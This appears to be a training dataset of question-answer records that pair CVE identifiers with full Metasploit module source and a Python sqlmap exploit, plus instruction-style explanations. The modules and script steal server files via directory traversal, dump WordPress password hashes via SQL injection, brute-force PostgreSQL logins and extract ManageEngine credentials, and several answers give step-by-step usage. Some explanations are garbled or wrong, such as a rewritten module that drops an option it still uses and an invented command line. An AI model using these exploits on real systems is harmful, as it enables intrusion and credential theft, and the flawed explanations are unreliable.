\"#{ip}:#{rport}\"    vprint_status(\"Retrieving cookie\")    res = send_request_cgi({      'method' => 'GET',      'uri'    => normalize_uri(uri, \"\")    })    if res and res.code == 200      session = res.get_cookies    else      vprint_error(\"Server returned #{res.code.to_s}\")    end    vprint_status(\"Logging in as user [ #{datastore['USER']} ]\")    res = send_request_cgi({      'method' => 'POST',      'uri'    => normalize_uri(uri, \"j_security_check\"),      'cookie' => session,      'vars_post' =>      {        'j_username' => datastore['USER'],        'j_password' => datastore['PASS'],        'logonDomainName' => 'undefined',        'sso_status' => 'false',        'loginButton' => 'Login'      }    })    if res and res.code == 302      vprint_status(\"Login succesful\")    else      vprint_error(\"Login was not succesful!\")      return    end    randomname = Rex::Text.rand_text_alphanumeric(10)    vprint_status(\"Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment\")    res = send_request_cgi({      'method' => 'POST',      'uri'    => normalize_uri(uri, \"WorkOrder.do\"),      'cookie' => session,      'vars_post' =>        {          'reqTemplate' => '',          'prodId' => '0',          'priority' => '2',          'reqID' => '2',          'usertypename' => 'Requester',          'reqName' => 'Guest',          'category' => '0',          'item' => '0',          'subCategory' => '0',          'title' => randomname,          'description' => randomname,          'MOD_IND' => 'WorkOrder',          'FORMNAME' => 'WorkOrderForm',          'attach' => \"/../../../../../../../../../../../..#{datastore['FILE']}\",          'attPath' => '',          'component' => 'Request',          'attSize' => Rex::Text.rand_text_numeric(8),          'attachments' => randomname,          'autoCCList' => '',          'addWO' => 'addWO'        }      })    if res and res.code == 200      vprint_status(\"Ticket created\")      if (res.body =~ /FileDownload.jsp\\?module=Request\\&ID=(\\d+)\\&authKey=(.*)\\\" class=/)        fileid = $1        vprint_status(\"File ID is [ #{fileid} ]\")        fileauthkey = $2        vprint_status(\"Auth Key is [ #{fileauthkey} ]\")      else        vprint_error(\"File ID and AuthKey not found!\")      end    else      vprint_error(\"Ticket not created due to error!\")      return    end    vprint_status(\"Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]\")    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, \"workorder\", \"FileDownload.jsp\"),      'vars_get' =>      {        'module' => 'Request',        'ID' => fileid,        'authKey' => fileauthkey      }    })    # If we don't get a 200 when we request our malicious payload, we suspect    # we don't have a shell, either.  Print the status code for debugging purposes.    if res and res.code == 200      data = res.body      p = store_loot(        'manageengine.supportcenterplus',        'application/octet-stream',        ip,        data,        datastore['FILE']      )      print_good(\"[ #{datastore['FILE']} ] loot stored as [ #{p} ]\")    else      vprint_error(\"Server returned #{res.code.to_s}\")    end  endend       Question: CVE-2014-100002[/INST] CVE-2014-100002 is a directory traversal vulnerability affecting ManageEngine Support Center Plus builds 7916 and lower. This vulnerability allows an attacker to create a support ticket as a normal user and attach a link to any file on the server. By requesting the attached file, the attacker can retrieve the file with the same privileges as Support Center Plus is running, which is often with SYSTEM privileges on Windows systems.The provided Metasploit module exploits this vulnerability by creating a support ticket with a specified file as an attachment, retrieving the file ID and auth key after the ticket creation, and then downloading the file using the provided id and auth key.To use the Metasploit module, you need to update your Metasploit framework first. Afterward, save the given Ruby code snippet as a `.rb` file, load it within the Metasploit console, and configure the options accordingly. Once configured, execute the module against the targeted IP address and port."}
{"query": "CVE-2021-24931", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  include Msf::Exploit::SQLi  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Wordpress Secure Copy Content Protection and Content Locking sccp_id Unauthenticated SQLi',        'Description' => %q{          Secure Copy Content Protection and Content Locking, a WordPress plugin,          prior to 2.8.2 is affected by an unauthenticated SQL injection via the          `sccp_id[]` parameter.          Remote attackers can exploit this vulnerability to dump usernames and password hashes          from the`wp_users` table of the affected WordPress installation. These password hashes          can then be cracked offline using tools such as Hashcat to obtain valid login          credentials for the affected WordPress installation.        },        'Author' => [          'h00die', # msf module          'Hacker5preme (Ron Jost)', # edb PoC          'Krzysztof Zaj\u0105c (kazet)', # Original bug discovery and writeup        ],        'License' => MSF_LICENSE,        'References' => [          ['CVE', '2021-24931'],          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md'],          ['URL', 'https://kazet.cc/2022/02/03/fuzzing-wordpress-plugins.html'],          ['EDB', '50733'],          ['WPVDB', '1cd52d61-af75-43ed-9b99-b46c471c4231'],        ],        'Actions' => [          ['List Users', { 'Description' => 'Queries username, password hash for USER_COUNT users' }]        ],        'DefaultAction' => 'List Users',        'DisclosureDate' => '2021-11-08',        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options [      OptInt.new('USER_COUNT', [true, 'Number of user credentials to enumerate', 3])    ]  end  def check_host(_ip)    unless wordpress_and_online?      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')    end    checkcode = check_plugin_version_from_readme('secure-copy-content-protection', '2.8.2')    if checkcode == Msf::Exploit::CheckCode::Safe      return Msf::Exploit::CheckCode::Safe('Secure Copy Content Protection and Content Locking version not vulnerable')    end    checkcode  end  def run_host(ip)    id = Rex::Text.rand_text_numeric(1..20)    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|      res = send_request_cgi({        'method' => 'POST',        'keep_cookies' => true,        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),        'vars_get' => {          'action' => 'ays_sccp_results_export_file',          'sccp_id[]' => \"#{id}) AND (SELECT #{Rex::Text.rand_text_numeric(4..20)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4..20)})-- #{Rex::Text.rand_text_alpha(4..20)}\",          'type' => 'json'        }      })      fail_with(Failure::Unreachable, 'Connection failed') unless res    end    unless @sqli.test_vulnerable      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")      return    end    columns = ['user_login', 'user_pass']    print_status('Enumerating Usernames and Password Hashes')    print_warning('Each user will take about 5-10 minutes to enumerate. Be patient.')    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['USER_COUNT'])    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)    data.each do |user|      create_credential({        workspace_id: myworkspace_id,        origin_type: :service,        module_fullname: fullname,        username: user[0],        private_type: :nonreplayable_hash,        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),        private_data: user[1],        service_name: 'Wordpress',        address: ip,        port: datastore['RPORT'],        protocol: 'tcp',        status: Metasploit::Model::Login::Status::UNTRIED      })      table << user    end    print_good('Dumped table contents:')    print_line(table.to_s)  endendEXPLOIT: # Exploit Title: WordPress Plugin Secure Copy Content Protection and Content Locking 2.8.1 - SQL-Injection (Unauthenticated)# Date 08.02.2022# Exploit Author: Ron Jost (Hacker5preme)# Vendor Homepage: https://ays-pro.com/# Software Link: https://downloads.wordpress.org/plugin/secure-copy-content-protection.2.8.1.zip# Version: < 2.8.2# Tested on: Ubuntu 20.04# CVE: CVE-2021-24931# CWE: CWE-89# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md'''Description:The Secure Copy Content Protection and Content Locking WordPress plugin before 2.8.2 does not escape thesccp_id parameter of the ays_sccp_results_export_file AJAX action (available to both unauthenticatedand authenticated users) before using it in a SQL statement, leading to an SQL injection.'''banner = ''' .--. .-..-. .--.       .---.  .--. .---.   ,-.       .---.   .-. .--. .----.  ,-.: .--': :: :: .--'      `--. :: ,. :`--. :.'  :       `--. : .'.': .; :`--  ;.'  :: :   : :: :: `;  _____   ,',': :: :  ,',' `: : _____   ,','.'.'_`._, : .' '  `: :: :__ : `' ;: :__:_____:.'.'_ : :; :.'.'_   : ::_____:.'.'_ :_ ` :  : : _`,`.  : :`.__.' `.,' `.__.'      :____;`.__.':____;  :_;       :____;  :_:   :_:`.__.'  :_;\t\t\t\t\t\t[+] Copy Content Protection and Content Locking - SQL Injection\t\t\t\t\t\t[@] Developed by Ron Jost (Hacker5preme)'''print(banner)import argparsefrom datetime import datetimeimport os# User-Input:my_parser = argparse.ArgumentParser(description= 'Copy Content Protection and Content Locking SQL-Injection (unauthenticated)')my_parser.add_argument('-T', '--IP', type=str)my_parser.add_argument('-P', '--PORT', type=str)my_parser.add_argument('-U', '--PATH', type=str)args = my_parser.parse_args()target_ip = args.IPtarget_port = args.PORTwp_path = args.PATH# Exploit:print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))print('[*] Payload for SQL-Injection:')exploitcode_url = r'sqlmap \"http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)*&type=json\" 'print('    Sqlmap options:')print('     -a, --all           Retrieve everything')print('     -b, --banner        Retrieve DBMS banner')print('     --current-user      Retrieve DBMS current user')print('     --current-db        Retrieve DBMS current database')print('     --passwords         Enumerate DBMS users password hashes')print('     --tables            Enumerate DBMS database tables')print('     --columns           Enumerate DBMS database table column')print('     --schema            Enumerate DBMS schema')print('     --dump              Dump DBMS database table entries')print('     --dump-all          Dump all DBMS databases tables entries')retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')exploitcode = exploitcode_url +  retrieve_mode + ' --answers=\"follow=Y\" --batch -v 0'os.system(exploitcode)print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))       Question: CVE-2021-24931[/INST] CVE-2021-24931 is an SQL injection vulnerability affecting the Wordpress plugin \"Secure Copy Content Protection and Content Locking\" version below 2.8.2. The vulnerability lies in the lack of escaping of the `sccp_id` parameter in the `ays_sccp_results_export_file` AJAX action, allowing remote attackers to inject SQL queries into the application. This can result in the leakage of sensitive information including usernames and password hashes.To demonstrate the vulnerability, you can refer to the provided Metasploit module written in Ruby. It uses the Time-Based Blind SQL injection technique to extract usernames and password hashes from the `wp_users` table of the affected WordPress installation. Additionally, there exists an exploit script written in Python by Hacker5preme that also takes advantage of this vulnerability. Both scripts require Metasploit framework to function properly.It is recommended to upgrade the plugin to its latest version (2.8.2 or above) to mitigate this risk."}
{"query": "CVE-2014-9707", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Embedthis GoAhead Embedded Web Server Directory Traversal',      'Description'    => %q{        This module exploits a directory traversal vulnerability in the Embedthis        GoAhead Web Server v3.4.1, allowing an attacker to read arbitrary files        with the web server privileges.      },      'References'     =>        [          ['CVE', '2014-9707'],          ['PACKETSTORM', '131156']        ],      'Author'         =>        [          'Matthew Daley', # Vulnerability discovery          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(80),        OptString.new('FILEPATH', [true, \"The path to the file to read\", \"/etc/passwd\"]),        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ /^\\//    traversal = \"../\" * datastore['DEPTH'] << \".x/\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"#{traversal}\"    })    if res &&        res.code == 200 &&        res.headers['Server'] &&        res.headers['Server'] =~ /GoAhead/      print_line(\"#{res.body}\")      fname = datastore['FILEPATH']      path = store_loot(        'goahead.traversal',        'text/plain',        ip,        res,        fname      )      print_good(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded\")    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Embedthis GoAhead Embedded Web Server Directory Traversal',      'Description'    => %q{        This module exploits a directory traversal vulnerability in the Embedthis        GoAhead Web Server v3.4.1, allowing an attacker to read arbitrary files        with the web server privileges.      },      'References'     =>        [          ['CVE', '2014-9707'],          ['PACKETSTORM', '131156']        ],      'Author'         =>        [          'Matthew Daley', # Vulnerability discovery          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(80),        OptString.new('FILEPATH', [true, \"The path to the file to read\", \"/etc/passwd\"]),        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ /^\\//    traversal = \"../\" * datastore['DEPTH'] << \".x/\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"#{traversal}\"    })    if res &&        res.code == 200 &&        res.headers['Server'] &&        res.headers['Server'] =~ /GoAhead/      print_line(\"#{res.body}\")      fname = datastore['FILEPATH']      path = store_loot(        'goahead.traversal',        'text/plain',        ip,        res,        fname      )      print_good(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded\")    end  endend       Question: CVE-2014-9707[/INST] CVE-2014-9707 is a directory traversal vulnerability affecting the Embedthis GoAhead embedded web server version 3.4.1. This vulnerability allows an attacker to read arbitrary files with the web server privileges by sending specially crafted requests to the targeted web server.To exploit this vulnerability, an attacker can create a Metasploit module that sends a GET request containing a directory traversal payload to the target web server. If successful, the server will return the contents of the specified file.Here's an example of a Metasploit module written in Ruby that takes advantage of this vulnerability:```rubyrequire 'msf/core'class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Embedthis GoAhead Embedded Web Server Directory Traversal',      'Description'    => %q{        This module exploits a directory traversal vulnerability in the Embedthis        GoAhead Web Server v3.4.1, allowing an attacker to read arbitrary files        with the web server privileges.      },      'References'     =>        [          ['CVE', '2014-9707'],          ['PACKETSTORM', '131156']        ],      'Author'         =>        [          'Matthew Daley', # Vulnerability discovery          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(80),        OptString.new('FILEPATH', [true, \"The path to the file to read\", \"/etc/passwd\"])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ /^\\//    traversal = \"../\" * datastore['DEPTH'] << \".x/\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"#{traversal}\"    })    if res &&        res.code == 200 &&        res.headers['Server'] &&        res.headers['Server'] =~ /GoAhead/      print_line(\"#{res.body}\")      fname = datastore['FILEPATH']      path = store_loot(        'goahead.traversal',        'text/plain',        ip,        res,        fname      )      print_good(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded\")    end  endend```This Metasploit module includes options for the remote port and the file path to be read. Once executed, it generates a directory traversal payload based on the provided depth value and sends a GET request to the target web server. If the request is successful, the server returns the contents of the specified file, which are then saved locally by the module."}
{"query": "CVE-1999-0502", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'metasploit/framework/credential_collection'require 'metasploit/framework/login_scanner/postgres'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::Postgres  include Msf::Auxiliary::AuthBrute  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  # Creates an instance of this module.  def initialize(info = {})    super(update_info(info,      'Name'           => 'PostgreSQL Login Utility',      'Description'    => %q{        This module attempts to authenticate against a PostgreSQL        instance using username and password combinations indicated        by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that        passwords may be either plaintext or MD5 formatted hashes.      },      'Author'         => [ 'todb' ],      'License'        => MSF_LICENSE,      'References'     =>        [          [ 'URL', 'https://www.postgresql.org/' ],          [ 'CVE', '1999-0502'], # Weak password          [ 'URL', 'https://hashcat.net/forum/archive/index.php?thread-4148.html' ] # Pass the Hash        ]    ))    register_options(      [        Opt::Proxies,        OptPath.new('USERPASS_FILE',  [ false, \"File containing (space-separated) users and passwords, one pair per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_userpass.txt\") ]),        OptPath.new('USER_FILE',      [ false, \"File containing users, one per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_user.txt\") ]),        OptPath.new('PASS_FILE',      [ false, \"File containing passwords, one per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_pass.txt\") ]),      ])    deregister_options('SQL', 'PASSWORD_SPRAY')  end  # Loops through each host in turn. Note the current IP address is both  # ip and datastore['RHOST']  def run_host(ip)    cred_collection = build_credential_collection(      realm: datastore['DATABASE'],      username: datastore['USERNAME'],      password: datastore['PASSWORD']    )    scanner = Metasploit::Framework::LoginScanner::Postgres.new(      host: ip,      port: rport,      proxies: datastore['PROXIES'],      cred_details: cred_collection,      stop_on_success: datastore['STOP_ON_SUCCESS'],      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],      connection_timeout: 30,      framework: framework,      framework_module: self,    )    scanner.scan! do |result|      credential_data = result.to_h      credential_data.merge!(          module_fullname: self.fullname,          workspace_id: myworkspace_id      )      if result.success?        credential_core = create_credential(credential_data)        credential_data[:core] = credential_core        create_credential_login(credential_data)        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"      else        invalidate_login(credential_data)        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"      end    end  end  # Alias for RHOST  def rhost    datastore['RHOST']  end  # Alias for RPORT  def rport    datastore['RPORT']  endend       Question: CVE-1999-0502 # Weak password[/INST] CVE-1999-0502 is a vulnerability related to weak passwords in PostgreSQL. The Metasploit Module provided in the given code snippet is designed to brute force credentials against a PostgreSQL instance using a list of usernames and passwords specified in various file options.One of the files mentioned is \"postgres\\_default\\_user.txt,\" which contains a list of usernames. Another file is \"postgres\\_default\\_pass.txt,\" which contains a list of passwords. The module checks for these files in the data directory of the Metasploit Framework by default, but users can specify their own paths.The vulnerability described in CVE-1999-0502 refers to weak passwords being used in PostgreSQL instances. The Metasploit Module does not directly target this vulnerability, but it can potentially discover systems with weak passwords if those passwords exist in the wordlist files used by the module.To leverage this code snippet to check for systems with weak passwords using CVE-1999-0502, follow these steps:1. Ensure you have Metasploit installed and configured properly.2. Save the given code snippet as a Ruby file, e.g., \"postgres\\_check.rb.\"3. Modify the file to include a list of weak passwords in a text file called \"weak\\_passwords.txt.\" Add this file path to the existing file options in the Metasploit Module.4. Run the script with the following command: `ruby postgres_check.rb --USERPASS_FILE <path_to_username_and_password_file> --USER_FILE <path_to_usernames_file> --PASS_FILE <path_to_weak_passwords_file> --RHOST <target_IP_address> --RPORT <target_Port>`5. The script will scan the target PostgreSQL instance using the provided username and password lists and the list of weak passwords. If any combination of a username and weak password is discovered to grant access, the script will output a message indicating a potential vulnerability according to CVE-1999-0502."}
{"query": "CVE-2014-5377", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(      info,      'Name'           => 'ManageEngine DeviceExpert User Credentials',      'Description'    => %q{        This module extracts usernames and salted MD5 password hashes        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.        This module has been tested successfully on DeviceExpert        version 5.9.7 build 5970.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit          'bcoles'  # metasploit module        ],      'References'     =>        [          ['EDB', '34449'],          ['OSVDB', '110522'],          ['CVE', '2014-5377']        ],      'DisclosureDate' => '2014-08-28'))    register_options(      [        Opt::RPORT(6060),        OptBool.new('SSL', [true, 'Use SSL', true])      ])  end  def check    get_users ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe  end  def get_users    users = nil    vprint_status(\"Reading users from master...\")    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))    if !res      vprint_error(\"Connection failed\")    elsif res.code == 404      vprint_error(\"Could not find 'ReadUsersFromMasterServlet'\")    elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\\/discoverydata>/      users = res.body.scan(/<discoverydata>(.*?)<\\/discoverydata>/)      vprint_good(\"Found #{users.length} users\")    else      vprint_error(\"Could not find any users\")    end    users  end  def parse_user_data(user)    return if user.nil?    username = user.scan(/<username>([^<]+)</).flatten.first    encoded_hash = user.scan(/<password>([^<]+)</).flatten.first    role = user.scan(/<userrole>([^<]+)</).flatten.first    mail = user.scan(/<emailid>([^<]+)</).flatten.first    salt = user.scan(/<saltvalue>([^<]+)</).flatten.first    hash = Rex::Text.decode_base64(encoded_hash).unpack('H*').flatten.first    pass = nil    ['12345', 'admin', 'password', username].each do |weak_password|      if hash == Rex::Text.md5(weak_password + salt)        pass = weak_password        break      end    end    [username, pass, hash, role, mail, salt]  end  def run_host(ip)    users = get_users    return if users.nil?    service_data = {      address: rhost,      port: rport,      service_name: (ssl ? 'https' : 'http'),      protocol: 'tcp',      workspace_id: myworkspace_id    }    cred_table = Rex::Text::Table.new(      'Header'  => 'ManageEngine DeviceExpert User Credentials',      'Indent'  => 1,      'Columns' =>        [          'Username',          'Password',          'Password Hash',          'Role',          'E-mail',          'Password Salt'        ]    )    vprint_status(\"Parsing user data...\")    users.each do |user|      record = parse_user_data(user.to_s)      next if record.join.empty?      user = record[0]      pass = record[1]      hash = record[2]      role = record[3]      mail = record[4]      salt = record[5]      cred_table << [user, pass, hash, role, mail, salt]      if pass        print_good(\"Found weak credentials (#{user}:#{pass})\")        credential_data = {          origin_type: :service,          module_fullname: self.fullname,          private_type: :password,          private_data: pass,          username: user        }      else        credential_data = {          origin_type: :service,          module_fullname: self.fullname,          private_type: :nonreplayable_hash,          private_data: \"#{salt}:#{hash}\",          username: user        }      end      credential_data.merge!(service_data)      credential_core = create_credential(credential_data)      login_data = {        core: credential_core,        access_level: role,        status: Metasploit::Model::Login::Status::UNTRIED      }      login_data.merge!(service_data)      create_credential_login(login_data)    end    print_line    print_line(\"#{cred_table}\")    loot_name     = 'manageengine.deviceexpert.user.creds'    loot_type     = 'text/csv'    loot_filename = 'manageengine_deviceexpert_user_creds.csv'    loot_desc     = 'ManageEngine DeviceExpert User Credentials'    p = store_loot(      loot_name,      loot_type,      rhost,      cred_table.to_csv,      loot_filename,      loot_desc)    print_status \"Credentials saved in: #{p}\"  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(      info,      'Name'           => 'ManageEngine DeviceExpert User Credentials',      'Description'    => %q{        This module extracts usernames and salted MD5 password hashes        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.        This module has been tested successfully on DeviceExpert        version 5.9.7 build 5970.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit          'bcoles'  # metasploit module        ],      'References'     =>        [          ['EDB', '34449'],          ['OSVDB', '110522'],          ['CVE', '2014-5377']        ],      'DisclosureDate' => '2014-08-28'))    register_options(      [        Opt::RPORT(6060),        OptBool.new('SSL', [true, 'Use SSL', true])      ])  end  def check    get_users ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe  end  def get_users    users = nil    vprint_status(\"Reading users from master...\")    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))    if !res      vprint_error(\"Connection failed\")    elsif res.code == 404      vprint_error(\"Could not find 'ReadUsersFromMasterServlet'\")    elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\\/discoverydata>/      users = res.body.scan(/<discoverydata>(.*?)<\\/discoverydata>/)      vprint_good(\"Found #{users.length} users\")    else      vprint_error(\"Could not find any users\")    end    users  end  def parse_user_data(user)    return if user.nil?    username = user.scan(/<username>([^<]+)</).flatten.first    encoded_hash = user.scan(/<password>([^<]+)</).flatten.first    role = user.scan(/<userrole>([^<]+)</).flatten.first    mail = user.scan(/<emailid>([^<]+)</).flatten.first    salt = user.scan(/<saltvalue>([^<]+)</).flatten.first    hash = Rex::Text.decode_base64(encoded_hash).unpack('H*').flatten.first    pass = nil    ['12345', 'admin', 'password', username].each do |weak_password|      if hash == Rex::Text.md5(weak_password + salt)        pass = weak_password        break      end    end    [username, pass, hash, role, mail, salt]  end  def run_host(ip)    users = get_users    return if users.nil?    service_data = {      address: rhost,      port: rport,      service_name: (ssl ? 'https' : 'http'),      protocol: 'tcp',      workspace_id: myworkspace_id    }    cred_table = Rex::Text::Table.new(      'Header'  => 'ManageEngine DeviceExpert User Credentials',      'Indent'  => 1,      'Columns' =>        [          'Username',          'Password',          'Password Hash',          'Role',          'E-mail',          'Password Salt'        ]    )    vprint_status(\"Parsing user data...\")    users.each do |user|      record = parse_user_data(user.to_s)      next if record.join.empty?      user = record[0]      pass = record[1]      hash = record[2]      role = record[3]      mail = record[4]      salt = record[5]      cred_table << [user, pass, hash, role, mail, salt]      if pass        print_good(\"Found weak credentials (#{user}:#{pass})\")        credential_data = {          origin_type: :service,          module_fullname: self.fullname,          private_type: :password,          private_data: pass,          username: user        }      else        credential_data = {          origin_type: :service,          module_fullname: self.fullname,          private_type: :nonreplayable_hash,          private_data: \"#{salt}:#{hash}\",          username: user        }      end      credential_data.merge!(service_data)      credential_core = create_credential(credential_data)      login_data = {        core: credential_core,        access_level: role,        status: Metasploit::Model::Login::Status::UNTRIED      }      login_data.merge!(service_data)      create_credential_login(login_data)    end    print_line    print_line(\"#{cred_table}\")    loot_name     = 'manageengine.deviceexpert.user.creds'    loot_type     = 'text/csv'    loot_filename = 'manageengine_deviceexpert_user_creds.csv'    loot_desc     = 'ManageEngine DeviceExpert User Credentials'    p = store_loot(      loot_name,      loot_type,      rhost,      cred_table.to_csv,      loot_filename,      loot_desc)    print_status \"Credentials saved in: #{p}\"  endend       Question: CVE-2014-5377[/INST] CVE-2014-5377 is a vulnerability affecting ManageEngine DeviceExpert versions 5.9 and prior. It allows an attacker to extract usernames and salted MD5 password hashes from the application. This vulnerability was discovered by Pedro Ribeiro and was assigned a Common Vulnerabilities and Exposures (CVE) identifier.The exploitation of this vulnerability involves sending a request to the 'ReadUsersFromMasterServlet' endpoint of the target server and parsing the response to obtain the required user information. The Metasploit framework provides a module named 'ManageEngine\\_DeviceExpert\\_User\\_Creds' that automates the discovery and extraction of this sensitive information.To leverage this module, follow these steps:1. Install Metasploit: If you don't already have it installed, download and set up Metasploit according to the official documentation.2. Use the provided code snippet as a reference to write a Ruby script using the Metasploit Module structure. Make sure to update the options, descriptions, references, and other metadata accordingly.3. Save the script as a '.rb' file within the '/modules/auxiliary/' directory of your Metasploit installation path.4. Start the Metasploit console and load the newly created auxiliary module using the 'use' command followed by the module filename.5. Set the target IP address and other necessary options using the 'set' command.6. Run the scan using the 'run' command.If successful, the script should display the extracted usernames, salted MD5 password hashes, roles, emails, and password salts. These findings can then be further analyzed or utilized for subsequent attacks depending on the context and objectives of the engagement."}
{"query": "CVE-2011-0807", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'nokogiri'require 'metasploit/framework/login_scanner/glassfish'require 'metasploit/framework/credential_collection'class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::HttpClient  include Msf::Exploit::EXE  include Msf::Auxiliary::Report  def initialize(info={})    super(update_info(info,      'Name'           => \"Sun/Oracle GlassFish Server Authenticated Code Execution\",      'Description'    => %q{          This module logs in to a GlassFish Server (Open Source or Commercial) using various        methods (such as authentication bypass, default credentials, or user-supplied login),        and deploys a malicious war file in order to get remote code execution. It has been        tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System Application Server 9.x. Newer        GlassFish versions do not allow remote access (Secure Admin) by default, but is required        for exploitation.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'juan vazquez', # Msf module for Glassfish 3.0          'Joshua Abraham <jabra[at]rapid7.com>', # Glassfish 3.1, 2.x & Sun Java System Application Server 9.1          'sinn3r' # Rewrite for everything        ],      'References'     =>        [          ['CVE', '2011-0807'],          ['OSVDB', '71948']        ],      'Platform'       => ['win', 'linux', 'java'],      'Targets'        =>        [          [ 'Automatic', { } ],          [ 'Java Universal',    { 'Arch' => ARCH_JAVA, 'Platform' => 'java' } ],          [ 'Windows Universal', { 'Arch' => ARCH_X86,  'Platform' => 'win' } ],          [ 'Linux Universal',   { 'Arch' => ARCH_X86,  'Platform' => 'linux' } ]        ],      'DisclosureDate' => '2011-08-04',      'DefaultTarget'  => 0))      register_options(        [          Opt::RPORT(4848),          OptString.new('APP_RPORT',[ true,  'The Application interface port', '8080']),          OptString.new('USERNAME', [ true, 'The username to authenticate as','admin' ]),          OptString.new('PASSWORD', [ true, 'The password for the specified username','' ]),          OptString.new('TARGETURI', [ true,  \"The URI path of the GlassFish Server\", '/']),          